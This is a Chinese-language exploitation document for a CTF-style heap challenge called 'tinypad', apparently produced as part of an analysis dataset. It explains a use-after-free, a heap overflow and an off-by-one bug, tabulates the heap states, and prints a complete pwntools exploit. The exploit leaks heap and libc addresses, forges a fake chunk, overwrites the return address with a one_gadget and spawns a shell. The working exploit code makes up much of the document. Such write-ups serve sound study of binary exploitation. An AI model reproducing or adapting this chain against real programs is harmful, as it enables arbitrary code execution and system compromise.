# 漏洞利用文档

## 执行环境
基于反编译代码和exp分析，程序运行环境如下：
- **架构**：64位ELF程序，使用x86-64指令集
- **保护机制**：
  - Full RELRO：GOT表不可写
  - 栈保护：启用Canary
  - NX：数据执行保护启用
  - 无PIE：代码段和数据结构地址固定
- **依赖库**：使用标准libc（通过ldd确认）
- **关键数据结构**：
  - `tinypad`全局数组：位于固定地址0x602040，包含4个条目
  - 每个条目16字节：偏移240（使用标志）、248（堆块指针）、256（大小）、264（内容指针）
- **运行需求**：需要标准输入输出，无特殊权限要求

## 漏洞成因
### 关键结构体分析
程序使用`tinypad`全局数组管理堆块：
```c
struct tinypad_entry {
    int in_use;          // 偏移240
    void *chunk_ptr;     // 偏移248  
    size_t size;         // 偏移256
    char *content_ptr;   // 偏移264
};
```

### 漏洞类型确认
1. **Use-After-Free (UAF) 漏洞**：
   - 在`delete`操作中，虽然调用`free`释放堆块，但未将`tinypad`中的指针置零
   - 允许通过`edit`或显示功能继续访问已释放的堆块（反编译代码LABEL_29附近）

2. **堆溢出漏洞**：
   - `edit`操作使用`strcpy(tinypad, content)`和`strcpy(content_ptr, tinypad)`
   - 无边界检查，可能溢出到相邻堆块（反编译代码中编辑逻辑部分）

3. **off-by-one 漏洞**：
   - 在分配时，大小限制为0x100，但实际可能写入更多数据
   - 结合UAF可导致堆元数据破坏

### 动态调试验证
从Step 1调试记录确认：
- 索引1和2释放后，`tinypad[264]`和`tinypad[280]`仍指向已释放堆块
- 通过UAF成功泄露heap和libc地址
- 堆溢出覆盖了fastbin块的fd指针

## 漏洞利用过程
### 内存变化时序分析

| 步骤 | 操作 | 堆状态变化 | tinypad状态 | 关键地址泄露/覆盖 |
|------|------|------------|-------------|-------------------|
| 1 | 分配3个块+释放1,2 | 形成fastbin链: 0x12c29000→0x12c29080 | 指针未清零，UAF确认 | 准备heap泄露 |
| 2 | 读取索引1内容 | 通过UAF读取fd指针 | - | heap_base = 泄露值 - 0x80 |
| 3 | 释放索引3 | 进入unsorted bin | 指针保留 | 准备libc泄露 |
| 4 | 读取索引3内容 | 读取main_arena地址 | - | libc_base = main_arena - 0x3c4b20 |
| 5 | 重新分配4个块 | 堆布局重构 | 新指针设置 | 为溢出准备 |
| 6 | 编辑索引3 | 在tinypad构建fake chunk | 0x602060处设置size=0x101 | 伪造chunk就位 |
| 7 | edit_ffff操作 | 覆盖索引1堆块fd指针 | 注入偏移计算值 | 为任意地址写准备 |
| 8 | 删除索引2 | 触发fastbin攻击 | - | fake chunk链接到bins |
| 9 | 编辑索引4 | 设置fake chunk指针 | fd/bk指向main_arena+88 | 完成unsortedbin链 |
| 10 | 分配特殊块 | 写入伪造数据 | 包含environ指针和one_gadget | 建立利用链 |
| 11 | 读取environ | 泄露栈地址 | - | main_ret_addr = environ - 240 |
| 12 | 编辑索引2,1 | 覆盖返回地址 | 0x602148存储one_gadget | 控制流劫持准备 |
| 13 | 退出程序 | 触发one_gadget | - | 获取shell权限 |
| 14 | interactive | 进程替换为/bin/dash | 原始堆状态丢失 | 利用成功 |

### 堆布局演变
- **初始**：连续堆块分配
- **阶段1**：fastbin链形成（0x80大小）
- **阶段2**：unsorted bin泄露libc
- **阶段3**：fake chunk在数据段构建
- **阶段4**：堆溢出修改元数据
- **阶段5**：任意地址写覆盖返回地址

## Exploit
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample22')
p = process('./data/sample22')
libc = elf.libc
log.info('PID: ' + str(proc.pidof(p)[0]))
main_arena_offset = 0x3c4b20  # libc中main_arena的偏移

def add(size, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'a')  # 添加命令
    p.recvuntil(b'(SIZE)>>> ')
    p.sendline(str(size).encode())
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)

def edit(idx, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'e')  # 编辑命令
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil(b'Is it OK?\n')
    p.sendline(b'Y')  # 确认编辑

def delete(idx):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'd')  # 删除命令
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())

def edit_ffff(n, diff):
    # 通过多次编辑实现精确的堆溢出
    for i in range(n + 1):
        data = diff.rjust(0x18 - i, b'f')
        edit(1, data)

# Step 1: 堆布局初始化 - 分配和释放创建fastbin链
p.recvuntil(b'  ============================================================================\n\n')
add(0x70, b'a' * 8)  # 索引1
add(0x70, b'b' * 8)  # 索引2  
add(0x100, b'c' * 8) # 索引3
delete(2)  # 释放索引2
delete(1)  # 释放索引1，形成fastbin链

# Step 2: 泄露堆地址 - 通过UAF读取fastbin fd指针
p.recvuntil(b' # CONTENT: ')
data = p.recvuntil(b'\n', drop=True)
heap_base = u64(data.ljust(8, b'\x00')) - 0x80
log.info("Heap base: " + hex(heap_base))

# Step 3: 释放大块进入unsorted bin
delete(3)  # 索引3释放，进入unsorted bin

# Step 4: 泄露libc地址 - 通过unsorted bin读取main_arena
p.recvuntil(b' # CONTENT: ')
data = p.recvuntil(b'\n', drop=True)
main_arena = u64(data.ljust(8, b'\x00')) - 88
libc.address = main_arena - main_arena_offset
log.info("Libc base: " + hex(libc.address))

# Step 5: 重新分配堆块构造新布局
add(0x18, b'a' * 0x18)        # 索引1
add(0x100, b'b' * 0xf8 + b'\x11')  # 索引2，末尾\x11用于伪造chunk大小
add(0x100, b'c' * 0xf8)       # 索引3  
add(0x100, b'd' * 0xf8)       # 索引4

# Step 6: 在tinypad中构建fake chunk
fakechunk_addr = 0x602040 + 0x20  # tinypad中的目标地址
fakechunk_size = 0x101
fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(fakechunk_addr)
edit(3, b'd'* 0x20 + fakechunk)  # 通过编辑写入fake chunk

# Step 7: 计算偏移并触发堆溢出
diff = heap_base + 0x20 - fakechunk_addr
diff_strip = p64(diff).strip(b'\0')
number_of_zeros = len(p64(diff)) - len(diff_strip)
edit_ffff(number_of_zeros, diff_strip)  # 精确溢出修改fd指针

# Step 8: 触发fastbin攻击
delete(2)
p.recvuntil(b'\nDeleted.')

# Step 9: 完善fake chunk的unsorted bin链
edit(4, b'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) + p64(main_arena + 88))

# Step 10: 分配并写入利用数据
one_gadget_addr = libc.address + 0x45226  # one_gadget地址
environ_pointer = libc.symbols['__environ']  # environ符号地址
# 构造包含environ指针和one_gadget的payload
fake_pad = b'f' * (0x100 - 0x20 - 0x10) + b'a' * 8 + p64(environ_pointer) + b'a' * 8 + p64(0x602148)
add(0x100 - 8, fake_pad)  # 分配特殊块

# Step 11: 泄露栈地址通过environ
p.recvuntil(b' # CONTENT: ')
environ_addr = p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')
environ_addr = u64(environ_addr)
log.info("Environ address: " + hex(environ_addr))

# Step 12: 覆盖返回地址
main_ret_addr = environ_addr - 30 * 8  # 计算main函数返回地址位置
edit(2, p64(main_ret_addr))  # 修改指针指向返回地址位置
edit(1, p64(one_gadget_addr))  # 写入one_gadget地址

# Step 13: 触发利用
p.recvuntil(b'(CMD)>>> ')
p.sendline(b'Q')  # 退出程序，触发one_gadget

# Step 14: 获取shell
p.interactive()  # 进入交互模式
```

### 关键注释说明
- **堆布局初始化**：通过精确的分配和释放顺序控制堆风水
- **地址泄露**：利用UAF和unsorted bin特性泄露关键地址
- **fake chunk构造**：在可控的全局数据段构建伪造堆块
- **堆溢出利用**：通过多次编辑实现精确的元数据覆盖
- **控制流劫持**：通过覆盖返回地址跳转到one_gadget
- **进程替换**：成功获取shell权限，完成利用

此exp充分利用了UAF、堆溢出和off-by-one漏洞，通过复杂的堆操作实现了从信息泄露到代码执行的完整利用链。
